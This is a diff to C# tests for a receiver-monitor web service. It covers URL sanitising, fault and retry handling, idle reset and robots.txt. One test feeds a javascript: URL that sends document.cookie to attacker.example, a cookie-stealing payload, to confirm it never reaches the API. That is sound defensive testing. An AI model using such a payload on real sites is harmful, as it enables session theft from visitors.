@@ -210,6 +210,87 @@ public class MonitorHostTests
     }
 
     [Fact]
+    public async Task A_Public_Url_That_Is_Not_A_Link_Never_Reaches_The_Api()
+    {
+        // The end of the path the directory's own string travels: what a browser is actually
+        // handed. Escaping the four HTML characters would not have stopped this one.
+        const string Hostile = "javascript:fetch('https://attacker.example/'+document.cookie)";
+        await using var h = await Harness.StartAsync(
+            Harness.DirectoryJson.Replace(
+                "\"public_url\": \"https://m9psy-1.instance.ubersdr.org/\"",
+                $"\"public_url\": \"{Hostile}\""));
+
+        string json = await h.GetAsync("/api/instances");
+
+        json.Should().NotContain("javascript:", "nothing may hand a visitor that link");
+        JsonElement dalgety = (await h.SnapshotAsync()).GetProperty("receivers").EnumerateArray()
+            .Single(r => r.GetProperty("slug").GetString() == DalgetySlug);
+        dalgety.GetProperty("publicUrl").GetString().Should().Be(
+            "https://m9psy-1.instance.ubersdr.org/",
+            "the receiver's own endpoint stands in, so the row still links somewhere true");
+
+        // And the receiver's own page carries the same checked value in its config message.
+        await h.GetAsync($"/r/{DalgetySlug}/");
+        using ClientWebSocket watching = await h.WatchAsync(DalgetySlug);
+        using JsonDocument config = await NextOfTypeAsync(watching, "config");
+        config.RootElement.GetProperty("receiverUrl").GetString().Should().NotContain("javascript:");
+    }
+
+    [Fact]
+    public async Task An_Open_That_Fails_In_A_Way_Nobody_Listed_Still_Faults_And_Still_Retries()
+    {
+        // The bug this pins: the catch was a list of exception types, a directory host that would
+        // not parse as a URI threw UriFormatException, which was not on it, and the station sat
+        // marked as attaching for ever - idle on the picker, a viewer waiting, no retry, and not
+        // one word anywhere.
+        await using var h = await Harness.StartAsync();
+        h.FailOpen(new UriFormatException("Invalid URI: The hostname could not be parsed."));
+        await h.GetAsync($"/r/{DalgetySlug}/");
+
+        using ClientWebSocket watching = await h.WatchAsync(DalgetySlug);
+        await h.UntilAsync(async () => (await h.RowAsync(DalgetySlug)).State == "faulted");
+
+        h.Errors.Should().Contain(e => e.Contains("cannot reach") && e.Contains("hostname"));
+        h.Preflights(DalgetyHost).Should().Be(1);
+
+        // And the ladder picks it up again rather than the station being wedged for good.
+        h.Time.Advance(MonitorHost.RebuildAfter);
+        await h.UntilAsync(() => Task.FromResult(h.Preflights(DalgetyHost) >= 2));
+    }
+
+    [Fact]
+    public async Task A_Faulted_Station_Nobody_Came_Back_To_Stops_Saying_It_Is_Broken()
+    {
+        // A fault describes a session that no longer exists. Left standing it would have the
+        // picker telling every visitor that a receiver is "not working just now" when nothing has
+        // been asked of it for a minute and it may well be perfectly fine.
+        await using var h = await Harness.StartAsync();
+        h.FailOpen(new UriFormatException("Invalid URI: The hostname could not be parsed."));
+        await h.GetAsync($"/r/{DalgetySlug}/");
+
+        ClientWebSocket watching = await h.WatchAsync(DalgetySlug);
+        await h.UntilAsync(async () => (await h.RowAsync(DalgetySlug)).State == "faulted");
+
+        await h.LeaveAsync(watching);
+        await h.UntilAsync(async () => (await h.RowAsync(DalgetySlug)).Viewers == 0);
+
+        h.Time.Advance(MonitorHost.RebuildAfter);
+        await h.UntilAsync(async () => (await h.RowAsync(DalgetySlug)).State == "idle");
+        h.Preflights(DalgetyHost).Should().Be(1, "nobody was watching, so nobody was asking");
+    }
+
+    [Fact]
+    public async Task Robots_Are_Asked_To_Leave_The_Receivers_And_The_Api_Alone()
+    {
+        await using var h = await Harness.StartAsync();
+
+        string robots = await h.GetAsync("/robots.txt");
+
+        robots.Should().Be("User-agent: *\nDisallow: /r/\nDisallow: /api/\n");
+        robots.Should().MatchRegex("^[\\x20-\\x7e\\n]+$", "everything this daemon serves is ASCII");
+    }
+
+    [Fact]
     public async Task The_Front_Page_Is_The_Picker()
     {
         await using var h = await Harness.StartAsync();
@@ -218,6 +299,30 @@ public class MonitorHostTests
         {
             string page = await h.GetAsync(path);
             page.Should().Contain("<!doctype html>").And.Contain("api/instances");
+        }
+    }
+
+    /// <summary>The next message of one type off a page's socket.</summary>
+    private static async Task<JsonDocument> NextOfTypeAsync(ClientWebSocket socket, string type)
+    {
+        var buffer = new byte[64 * 1024];
+        using var giveUp = new CancellationTokenSource(TimeSpan.FromSeconds(20));
+        while (true)
+        {
+            WebSocketReceiveResult got = await socket.ReceiveAsync(buffer, giveUp.Token);
+            if (got.MessageType != WebSocketMessageType.Text)
+            {
+                continue;
+            }
+
+            var document = JsonDocument.Parse(buffer.AsMemory(0, got.Count));
+            if (document.RootElement.TryGetProperty("type", out JsonElement kind)
+                && kind.GetString() == type)
+            {
+                return document;
+            }
+
+            document.Dispose();
         }
     }
 
@@ -235,8 +340,9 @@ public class MonitorHostTests
         private readonly Dictionary<string, Receiver> _receivers = new(StringComparer.Ordinal);
         private readonly List<ClientWebSocket> _sockets = [];
 
-        private Harness()
+        private Harness(string directoryJson)
         {
+            _directoryJson = directoryJson;
             foreach (string host in (string[])[DalgetyHost, ReadingHost])
             {
                 _receivers[host] = new Receiver();
@@ -266,11 +372,16 @@ public class MonitorHostTests
                 DeadFeed = new DeadFeedConfig { SilenceSeconds = 0, StarvationSeconds = 0 },
                 TimeProvider = Time,
                 Journal = _ => new StationJournal("", Lines.Add, Errors.Add),
-                FetchDirectory = _ => Task.FromResult(DirectoryJson),
+                FetchDirectory = _ => Task.FromResult(_directoryJson),
                 OpenInput = (receiver, log, _) =>
                 {
                     Receiver fake = _receivers[receiver.Host];
                     Interlocked.Increment(ref fake.Preflights);
+                    if (_openFailure is { } failure)
+                    {
+                        throw failure;
+                    }
+
                     return Task.FromResult(new OnDemandUberSdrInput(
                         receiver.Endpoint,
                         new ConnectionResponse { Allowed = true, MaxSessionTime = 3600 },
@@ -295,7 +406,18 @@ public class MonitorHostTests
             _http = new HttpClient { BaseAddress = new Uri($"http://127.0.0.1:{port}") };
         }
 
+        private readonly string _directoryJson;
+        private Exception? _openFailure;
+
         internal FakeTimeProvider Time { get; } = new();
+
+        /// <summary>Every later attempt to open a receiver throws this.</summary>
+        internal void FailOpen(Exception failure) => _openFailure = failure;
+
+        /// <summary>The whole snapshot, for a test that wants to read a field this harness does
+        /// not model.</summary>
+        internal async Task<JsonElement> SnapshotAsync() =>
+            JsonDocument.Parse(await GetAsync("/api/instances")).RootElement.Clone();
 
         internal List<string> Lines { get; } = [];
 
@@ -303,9 +425,9 @@ public class MonitorHostTests
 
         internal Uri BaseAddress => _http.BaseAddress!;
 
-        internal static async Task<Harness> StartAsync()
+        internal static async Task<Harness> StartAsync(string? directoryJson = null)
         {
-            var harness = new Harness();
+            var harness = new Harness(directoryJson ?? DirectoryJson);
             (await harness._host.StartAsync()).Should().Be(0, "the site has to come up");
             return harness;
         }
@@ -406,7 +528,7 @@ public class MonitorHostTests
         }
 
         /// <summary>Two receivers, in the directory's own field names and shapes.</summary>
-        private const string DirectoryJson = """
+        internal const string DirectoryJson = """
             {"count": 2, "instances": [
               {"host": "m9psy-1.instance.ubersdr.org", "port": 443, "tls": true,
                "callsign": "M9PSY-1", "name": "RX888 with 40m Full Wave Loop (GPSDO)",
